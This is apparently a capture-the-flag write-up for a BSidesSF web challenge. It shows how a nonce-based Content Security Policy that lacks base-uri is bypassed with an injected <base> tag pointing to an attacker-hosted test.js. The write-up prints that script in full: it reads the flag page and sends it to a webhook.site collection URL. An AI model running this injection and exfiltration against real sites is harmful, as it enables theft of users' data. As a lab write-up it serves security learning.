<img width="1774" height="1297" alt="image" src="https://github.com/user-attachments/assets/d86434a2-499d-4448-9c5b-7dcf6702d2e3" />

The Content Security Policy (CSP) has now been fixed with slightly more security features:
- `default-src 'self';`: The `unsafe-inline` is removed. No more inline scripts, most XSS payloads will be blocked.
- `script-src 'self' 'nonce-random';` Specifically for JavaScript, inline scripts will only be allowed if they have the correct nonce <br>

Example:
```
<!-- ✅ This works (nonce matches) -->
<script nonce="7B2x3mNpQ9vL">
  fetch('/api/data');
</script>

<!-- ❌ This is BLOCKED (no nonce) -->
<script>
  fetch('/api/data');
</script>

```

- `connect-src *;`: Again, Fetch/XHR will connect to any external domain.

We can just inject a script with the `<script>` tag anymore.<br>

https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#nonce-based-strict-policy <br>
```
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```
Based on OWASP, the recommend CSP when using `nonce` is to pair it with `base-uri 'none'`. `base-uri` determines whether we can use the `<base>` tag to add another base URL for all relative URLs on the page. Setting it to none will block this function. Noting that our challenge's CSP does not specify `base-uri`, we can exploit this.<br>

In hint 3, it was mentioned that the result page tries to load test.js with a valid nonce, but that file does not exist.<br>

<img width="2543" height="1058" alt="image" src="https://github.com/user-attachments/assets/389d1992-d4d4-47d8-a4c5-59cbfdcd3d76" />

The idea is we will host our `test.js` on our site that contains our XSS payload, and use the `<base>` tag to add our site as a base reference URL for the relative URL `/test.js`. The website should then fetch our version of `test.js` and run it!<br>

test.js
```
fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag')
  .then(response => response.text())
  .then(data => {
    fetch('https://webhook.site/c24daaeb-f658-477f-80a2-7c00b5f4a933/?flag=' + encodeURIComponent(data));
  });
```
Create a website hosting this `test.js` using CloudFare pages (very easy to do), and enter this into the payload entry on the bottom of the page to add our CloudFare site as a base reference URL for all subsequent relative URLs: <br>

`<base href='https://ee0789ac.testing-1sh.pages.dev'>`

<img width="1944" height="975" alt="image" src="https://github.com/user-attachments/assets/11ae0f65-9fb1-4e96-a50e-8c506ddccb61" /><br>

<img width="1045" height="593" alt="image" src="https://github.com/user-attachments/assets/5bacb86e-e5e7-42a8-b660-26edbad739fb" />






